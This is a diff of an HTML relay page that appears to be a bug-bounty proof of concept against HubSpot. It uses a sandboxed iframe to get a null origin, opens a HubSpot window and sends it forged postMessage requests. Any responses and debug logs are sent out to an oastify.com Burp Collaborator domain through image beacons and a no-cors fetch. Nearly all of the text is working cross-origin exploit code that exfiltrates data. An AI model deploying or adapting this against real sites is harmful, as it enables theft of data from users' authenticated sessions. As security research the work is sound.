@@ -4,42 +4,57 @@
     <title>Loading...</title>
 </head>
 <body>
-<script>
-// Your Burp Collaborator domain
-const EXFIL_DOMAIN = 'sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';
+    <h1>Relay Page Loaded</h1>
+    <div id="status">Waiting for instructions...</div>
 
-function exfil(data) {
-    const encoded = encodeURIComponent(JSON.stringify(data));
-    new Image().src = 'https://' + EXFIL_DOMAIN + '/?data=' + encoded;
+<script>
+const EXFIL = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';
+
+function log(msg) {
+    document.getElementById('status').innerHTML += '<br>' + msg;
+    new Image().src = EXFIL + '/?log=' + encodeURIComponent(msg);
 }
+
+log('relay_page_loaded');
 
 // Listen for instructions from opener
 window.addEventListener('message', function(e) {
+    log('got_message_from: ' + e.origin);
+    log('message_data: ' + JSON.stringify(e.data));
+    
     if (e.data.action === 'startExploit') {
-        exfil({step: 'received_instruction', origin: e.origin});
+        log('starting_exploit');
         
         // Create sandboxed iframe
         const sandbox = document.createElement('iframe');
         sandbox.sandbox = 'allow-scripts allow-popups allow-same-origin';
-        sandbox.style.display = 'none';
+        sandbox.style.width = '100%';
+        sandbox.style.height = '400px';
+        sandbox.style.border = '2px solid red';
         
         sandbox.srcdoc = `
+            <h2>Sandbox Created</h2>
+            <div id="log"></div>
             <script>
-                const EXFIL = 'https://${EXFIL_DOMAIN}';
+                const EXFIL = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';
                 
                 function log(msg) {
-                    new Image().src = EXFIL + '/?log=' + encodeURIComponent(msg);
+                    document.getElementById('log').innerHTML += '<br>' + msg;
+                    new Image().src = EXFIL + '/?sandbox=' + encodeURIComponent(msg);
                 }
                 
-                log('sandbox_created');
+                log('sandbox_script_running');
+                log('window_origin: ' + window.origin);
                 
-                // Open HubSpot - origin becomes null
+                // Open HubSpot
+                log('attempting_to_open_hubspot');
                 let hub = window.open('https://app-eu1.hubspot.com', 'hubspot', 'width=800,height=600');
                 
                 if (!hub) {
-                    log('popup_blocked');
+                    log('ERROR: popup_blocked');
                 } else {
-                    log('popup_opened');
+                    log('SUCCESS: popup_opened');
+                    log('popup_origin: ' + hub.origin);
                     
                     // Poll until loaded
                     let attempts = 0;
@@ -47,80 +62,44 @@ window.addEventListener('message', function(e) {
                         attempts++;
                         
                         try {
-                            // This will throw when loaded (becomes cross-origin)
                             let test = hub.origin;
-                            log('attempt_' + attempts + '_still_loading');
+                            if (attempts % 10 === 0) {
+                                log('still_loading_attempt_' + attempts);
+                            }
                         } catch(e) {
                             clearInterval(checker);
-                            log('hubspot_loaded_after_' + attempts + '_attempts');
+                            log('LOADED after ' + attempts + ' attempts');
+                            log('error_message: ' + e.message);
                             
-                            // Both windows now have null origin!
-                            log('origins_matched_null');
-                            
-                            // Set up response listener
+                            // Listen for responses
                             window.addEventListener('message', function(resp) {
-                                log('got_response_from_hubspot');
-                                
-                                // Exfiltrate response
-                                fetch(EXFIL + '/response', {
-                                    method: 'POST',
-                                    mode: 'no-cors',
-                                    body: JSON.stringify({
-                                        origin: resp.origin,
-                                        data: resp.data
-                                    })
-                                });
-                                
-                                // Also try image beacon
-                                new Image().src = EXFIL + '/?resp=' + encodeURIComponent(JSON.stringify(resp.data).substring(0, 500));
+                                log('GOT_RESPONSE from: ' + resp.origin);
+                                new Image().src = EXFIL + '/?response=' + encodeURIComponent(JSON.stringify(resp.data).substring(0, 200));
                             });
                             
-                            // Send exploits to HubSpot
-                            log('sending_exploit_1');
-                            
-                            // Exploit 1: Content Assistance (no origin check)
-                            hub.postMessage({
-                                type: 'CONTENT_ASSISTANCE_DELEGATED_REQUEST',
-                                commandId: 'exploit',
-                                featureId: 'test',
-                                parameters: {exploit: 'data'},
-                                resultCount: 1,
-                                language: 'en',
-                                objectId: '46962361',
-                                applicationId: 'test',
-                                basePath: '/',
-                                maxPollingAttempts: 1,
-                                pollingInterval: 100
-                            }, '*');
-                            
+                            // Send exploit
                             setTimeout(() => {
-                                log('sending_exploit_2');
-                                
-                                // Exploit 2: Redux action
+                                log('sending_postMessage_to_hubspot');
                                 hub.postMessage({
-                                    type: 'raw',
-                                    _callbackId: 'exploit-123',
-                                    body: {
-                                        action: 'getData'
-                                    }
+                                    type: 'CONTENT_ASSISTANCE_DELEGATED_REQUEST',
+                                    commandId: 'test123',
+                                    featureId: 'test',
+                                    parameters: {},
+                                    resultCount: 1,
+                                    language: 'en',
+                                    objectId: '1',
+                                    applicationId: 'test',
+                                    basePath: '/',
+                                    maxPollingAttempts: 1,
+                                    pollingInterval: 100
                                 }, '*');
+                                log('postMessage_sent');
                             }, 1000);
-                            
-                            setTimeout(() => {
-                                log('sending_exploit_3');
-                                
-                                // Exploit 3: Dark mode (test origin check bypass)
-                                hub.postMessage({
-                                    type: 'TOGGLE_DARK_MODE',
-                                    isDarkMode: true
-                                }, '*');
-                            }, 2000);
                         }
                         
-                        // Timeout after 30 seconds
-                        if (attempts > 300) {
+                        if (attempts > 100) {
                             clearInterval(checker);
-                            log('timeout_after_' + attempts + '_attempts');
+                            log('TIMEOUT after 100 attempts');
                         }
                     }, 100);
                 }
@@ -128,16 +107,16 @@ window.addEventListener('message', function(e) {
         `;
         
         document.body.appendChild(sandbox);
-        exfil({step: 'sandbox_created'});
+        log('sandbox_iframe_added_to_page');
     }
 });
 
-// Notify opener we're ready
+// Notify opener
 if (window.opener) {
-    exfil({step: 'relay_ready', opener_exists: true});
+    log('has_opener_sending_ready_message');
     window.opener.postMessage({status: 'relay ready'}, '*');
 } else {
-    exfil({step: 'relay_ready', opener_exists: false});
+    log('NO_OPENER_FOUND');
 }
 </script>
 </body>
